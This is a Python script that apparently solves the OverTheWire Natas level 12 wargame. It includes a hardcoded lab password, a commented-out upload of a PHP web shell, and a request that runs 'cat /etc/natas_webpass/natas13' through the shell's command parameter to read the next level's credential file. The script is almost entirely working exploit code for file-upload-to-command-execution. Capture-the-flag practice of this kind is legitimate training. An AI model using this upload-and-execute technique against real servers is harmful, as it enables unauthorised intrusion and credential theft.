from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re

u='natas12'
p='EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
l=f'http://{u}.natas.labs.overthewire.org'
#resp=requests.post(l,data={'filename':'natas12_revshell.php','MAX_FILE_SIZE':'1000'},files={'uploadedfile':open('natas12_revshell.php','rb')},auth=(u, p))
pa='/upload/jvwqw42ywk.php'
command='cat /etc/natas_webpass/natas13'
resp=requests.get(l+pa+'?c='+command,auth=(u, p))
print(resp.text)
